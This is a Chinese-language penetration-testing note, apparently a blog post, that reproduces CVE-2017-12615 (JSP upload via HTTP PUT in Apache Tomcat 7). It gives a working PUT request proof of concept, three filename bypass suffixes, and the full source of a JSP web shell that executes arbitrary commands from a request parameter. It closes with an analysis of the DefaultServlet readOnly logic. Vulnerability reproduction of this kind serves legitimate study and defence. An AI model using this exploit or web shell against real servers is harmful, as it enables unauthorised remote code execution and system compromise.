---
title: CVE-2017-12615
date: 2023-09-03T15:29:52+08:00
updated: 2023-07-26T02:29:13+08:00
categories: 
- 渗透测试
- 漏洞复现
- Tomcat
---

## CVE-2017-12615

漏洞影响版本：Apache Tomcat 7.0.0 - 7.0.79（windows）

漏洞原理：当 Tomcat 运行在 Windows 主机上，且启用了 HTTP PUT 请求方法（例如，将 readonly 初始化参数由默认值设置为 false），攻击者将有可能可通过精心构造的攻击请求向服务器上传包含任意代码的 JSP 文件。之后，JSP 文件中的代码将能被服务器执行。

利用条件：漏洞利用需要在 Windows 环境，且需要将 readonly 初始化参数由默认值设置为 false，经过实际测试，Tomcat 7.x 版本内 web.xml 配置文件内默认配置无 readonly 参数，需要手工添加，默认配置条件下不受此漏洞影响

### POC：

虽然readonly为false，但是对写入文件的名称仍然有一定限制,linux可以通过1.jsp/的形式绕过限制

```
PUT /1.jsp/ HTTP/1.1
Host: your-ip:8080
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 5

shell
```

![2017-12615](E:\笔记软件\笔记\渗透测试\vulhub-CVE复现\2017-12615.png)

成功利用漏洞

jspshell

```java
<%@ page import="java.util.*,java.io.*"%>
<%
%>
<HTML><BODY>
Commands with JSP
<FORM METHOD="GET" NAME="myform" ACTION="">
<INPUT TYPE="text" NAME="cmd">
<INPUT TYPE="submit" VALUE="Send">
</FORM>
<pre>
<%
if (request.getParameter("cmd") != null) {
    out.println("Command: " + request.getParameter("cmd") + "<BR>");
    Process p;
    if ( System.getProperty("os.name").toLowerCase().indexOf("windows") != -1){
        p = Runtime.getRuntime().exec("cmd.exe /C " + request.getParameter("cmd"));
    }
    else{
        p = Runtime.getRuntime().exec(request.getParameter("cmd"));
    }
    OutputStream os = p.getOutputStream();
    InputStream in = p.getInputStream();
    DataInputStream dis = new DataInputStream(in);
    String disr = dis.readLine();
    while ( disr != null ) {
    out.println(disr);
    disr = dis.readLine();
    }
}
%>
</pre>
</BODY></HTML>
```

### 原理分析

漏洞原因是由于org.apache.catalina.servlets.DefaultServlet.java中readOnly设置为false造成

```java
/**
     * Read only flag. By default, it's set to true.
     */
    protected boolean readOnly = true;//由于下载的是8版本的源码，这里为true
```

jsp和jspx默认都由 org.apache.jasper.servlet.JspServlet处理(该类并没有处理PUT请求的方法仅处理后缀)，导致即使使用PUT也无法上传jsp和jspx文件，通过添加后缀来进入DefaultServlet的put逻辑处理上传的恶意文件造成漏洞，常见的三种后缀

```
1.jsp%20
1.jsp::$DATA
1.jsp/
```

查看该DefaultServelet中的PUT处理逻辑

```java
    @Override
    protected void doPut(HttpServletRequest req, HttpServletResponse resp)
        throws ServletException, IOException {

        if (readOnly) {
            sendNotAllowed(req, resp);
            return;
        }
    ........................
```

如果readOnly为true则直接返回error，因此需要设置为false

写入文件的操作位于FileDirContext.java 的 rebind 函数，使用1.jsp%20，1.jsp::$DATA两种方式能够写入文件是由于java.io. FileOutputStream底层C代码的处理，使用1.jsp/请求是由于java.io.File的特性造成的，在使用该方法时，末尾的斜杠会被过滤，具体代码

```
normalize(path, n, (prev == slash) ? i - 1 : i)
```

过滤掉/进行jsp文件的写入

### 参考链接

https://paper.seebug.org/399/

https://www.w3.org/Protocols/rfc2616/rfc2616-sec9.html